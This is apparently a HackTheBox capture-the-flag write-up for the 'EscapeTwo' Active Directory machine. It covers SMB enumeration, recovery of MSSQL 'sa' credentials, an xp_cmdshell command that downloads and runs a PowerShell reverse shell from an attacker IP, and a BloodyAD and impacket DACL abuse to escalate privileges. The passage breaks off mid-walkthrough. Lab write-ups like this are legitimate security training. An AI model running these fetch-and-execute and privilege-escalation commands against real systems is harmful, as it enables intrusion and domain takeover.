---
title: "EscapeTwo - HackTheBox Machine"
date: 2025-04-25 00:00:00 
categories: [Hack The Box,Active Directory]
tags: [HTB,CTFs,Active Directory]
---
![EscapeTwo machine banner](../pics/escape.png "EscapeTwo machine banner")

## 📝 Description

As is common in real-life Windows pentests, we begin this box with pre-given credentials:

**Username:** `rose`  
**Password:** `KxEPkKe6R8su`

---

## 🔍 Enumeration

We'll start with a basic **Nmap** scan using the following command:

```bash
nmap -sC -sV -sT 10.10.11.51
```
![nmap](../pics/nmap.png)
we will notice this valuable info 
```
DC01.sequel.htb
1433/tcp open  Microsoft SQL Server
389/tcp  open  LDAP
88/tcp   open  Microsoft Windows Kerberos
445/tcp  open  Microsoft-ds SMB
```
## 📁 SMB Enumeration

Let’s enumerate the **SMB protocol** using the credentials we obtained earlier.

We'll use a tool called **`smbmap`** to list accessible shares.

### 🛠️ Recon:

```bash
smbmap -u rose -p KxEPkKe6R8su -H sequel.htb
```
![](../pics/smb.png)
```plaintext
[+] IP: 10.10.11.51:445   Name: sequel.htb   Status: Authenticated

    Disk                   Permissions    Comment
    ----                   -----------    -------
    Accounting Department  READ ONLY
    ADMIN$                 NO ACCESS      Remote Admin
    C$                     NO ACCESS      Default share
    IPC$                   READ ONLY      Remote IPC
    NETLOGON               READ ONLY      Logon server share
    SYSVOL                 READ ONLY      Logon server share
    Users                  READ ONLY
    
```
Let's try to connect to smb and check accounting department 
![](../pics/files.png)
we found 2 files and we downloaded them to our local machine using "get" command in smb client

now lets check the type of these files 
![](../pics/filess.png)
we found out its not spreedshet its comprised file so after extracting the files and check them out we got these credentials:
![](../pics/xml%20.png)
we notice **sa** credentials
```
sa is the defult admin account for connecting and managing the MSSQL Database
``` 
### 🧩 Attempting MSSQL Access with `impacket-mssqlclient`

We try to connect to the MSSQL service using **default `sa` credentials**.

```bash
impacket-mssqlclient escapetwo.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51
```
![](../pics/sql.png)
Cool now we have to enable xp_cmdshell to be able to execute commands on the system we can enable it by : 
```bash
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
 ```
 ![](../pics/sqls.png)
 ### 🛠️ Trying to get reverse shell:
 okay let's get reverse shell on the machine 
 first we will need to craft our powershell script to give us reverse shell
 ![](../pics/shell.png)
 then we will run python server and make the machine to download it by this command :
 ```powershell
 EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.16.2/shellx.ps1'')"';
```
Boom we got reverse shell now :
![](../pics/frommachine.png)

after some digging i found configuration file leaking sql_svc information 
```bash
Wqxxxxxxxxxxxxxxxx
```
Also i found user called ryan : 
![](../pics/ryan.png)
Lets use these credintials to login and try to get the user flag : 
![](../pics/userflag.png)
we got the user flag now 
## ⚡privilege escalation
Let's use bloodhound in order to find somehting we can exploit in order to get privilege escalation 
![](../pics/bloodhound.png)

we see here that the user **ryan** has WriteOwner permission on CA_SVC so thats mean that **ryan** can change the Owner of CA_SVC.

CA_SVC is member of CERT_publisher so it has the right to be the certificate issuer.

we will use BloodyAD to perform this 
```
bloodyAD can perform specific LDAP calls to a domain controller in order to perform AD privesc. It supports authentication using cleartext passwords, pass-the-hash, pass-the-ticket or certificates and binds to LDAP services of a domain controller to perform AD privesc.
```
so let's do it and change the owner to ryan
![](../pics/blood.png)
Done :)

Now we need to abuse this and this attack called **Grant Rights Abuse**

### Grant Rights Abuse
In Active Directory (AD), Grant Rights abuse occurs when an attacker gains control over an object that has WriteDacl (Write permissions on the Discretionary Access Control List) over another object. This allows the attacker to modify the target object's DACL (Discretionary Access Control List) by adding a malicious Access Control Entry (ACE), effectively granting themselves or another account unauthorized privileges.

so we will modify the DACL (Discretionary Access Control List) of a target account **ca_svc** in Active Directory, granting full control to **ryan**

we will use impacket tool to perform this 
```bash
impacket-dacledit  -action 'write' -rights 'FullControl' -principal 'user' -target 'ca_svc' 'sequel.htb'/"user":"password"
```

![](../pics/dacl.png)

okay now what ???
now after we changed the owner 